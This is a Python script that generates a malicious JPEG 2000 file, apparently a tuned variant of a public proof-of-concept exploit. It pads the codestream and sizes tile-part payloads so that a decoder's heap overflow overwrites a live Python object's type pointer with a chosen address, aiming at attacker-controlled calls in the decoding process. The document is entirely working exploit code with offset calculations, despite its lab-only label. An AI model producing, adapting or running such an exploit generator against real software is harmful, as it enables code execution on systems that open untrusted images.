#!/usr/bin/env python3
"""Build the chosen-call variant of the pinned public PoC.

Fixed COM pad (10,731,137 bytes) plus two SOD payloads: N1 bytes in tile part 1
and N2 bytes in tile part 60. Their sum fixes the stream offset of tile part
154; trading bytes between them changes heap placement without changing any
write value. Tile part 59's second store writes &PyCode_Type, preserving the
live object it lands on; tile part 154's first store writes a chosen static
type address into the ob_type of a gap-aligned live object whose ob_refcnt is
untouched. Local-process lab use only.

Usage: make-chosen-call.py SRC.j2k OUT.j2k EVIL N1 N2
"""
import sys

src, dst, evil, n1, n2 = sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5])
pstart = 60
pad_len = 10731137
orig = bytearray(open(src, 'rb').read())
hdr = bytes(orig[:0x76])
first = bytes(orig[0x76:0x91])
tail = bytes(orig[0xad:])


def sot(i, payload=0):
    return (b'\xff\x90\x00\x0a\x00\x00' + (14 + payload).to_bytes(4, 'big')
            + bytes([i, 0]) + b'\xff\x93' + b'B' * payload)


segs, left = [], pad_len
while left > 0:
    m = min(left - 6, 65531)
    segs.append(b'\xff\x64' + (4 + m).to_bytes(2, 'big') + b'\x00\x00' + b'A' * m)
    left -= 6 + m
pad = b''.join(segs)
assert len(pad) == pad_len

parts = [sot(i, n1 if i == 1 else (n2 if i == pstart else 0))
         for i in range(1, evil + 1)]
out = hdr + pad + first + b''.join(parts) + tail
open(dst, 'wb').write(out)


def sod(k):
    return (len(hdr) + len(pad) + len(first) + n1 + (k - 1) * 14
            + (n2 if k > pstart else 0) + 12)


print('N1=%d N2=%d EVIL=%d LEN=%d SOD59=%d W2_59=%d SOD154=%d'
      % (n1, n2, evil, len(out), sod(59), sod(59) + 2, sod(154)))
